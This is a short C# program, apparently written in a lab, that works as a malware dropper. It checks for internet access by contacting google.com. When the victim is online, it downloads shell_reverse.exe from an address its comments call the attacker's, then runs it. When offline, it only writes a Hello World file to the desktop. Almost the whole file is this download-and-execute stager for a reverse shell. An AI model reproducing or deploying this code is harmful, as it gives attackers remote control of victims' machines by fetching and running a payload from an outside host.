using System;
using System.Net;
using System.Runtime.InteropServices;
using System.Collections.Generic;
using System.ComponentModel;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.IO;

public class CheckInternet
{
    static void Main(string[] args)
    {
        if(CheckInternetConnection()==true)//if victim connect internet
	{
	   var webClient = new WebClient(); //create class to send and receive data
	   //Download File from attacker's address
           webClient.DownloadFile(new Uri("http://10.0.5.131/shell_reverse.exe"), @"C:\Users\IEUser\Downloads\shell_reverse.exe");
	   //Process process = new Process();
	   Process.Start(@"C:\Users\IEUser\Downloads\shell_reverse.exe");//execute file which just downloaded

  	}
	else //if victim offline
	{
	string fileName = @"C:\Users\IEUser\Desktop\File.txt";//Create path at Desktop 
	 // Check if file already exists. If yes, delete it.     
	    if (File.Exists(fileName))    
	    {    
		File.Delete(fileName);    
	    }    
	    
	    // Create a new file     
	    using (StreamWriter writer = File.CreateText(fileName)) 
	    {
		writer.WriteLine("Hello World");//write data into file
	    }	
      }
}

    public static bool CheckInternetConnection()
    {
        try
        {
            using (var client = new WebClient())
            using (var stream = client.OpenRead("http://www.google.com"))//check connect to google
            {
                return true; //if data is returned, the victim connect internet
            }
        }
        catch //if not, the internet don't had
        {
            return false;
        }
     }
}
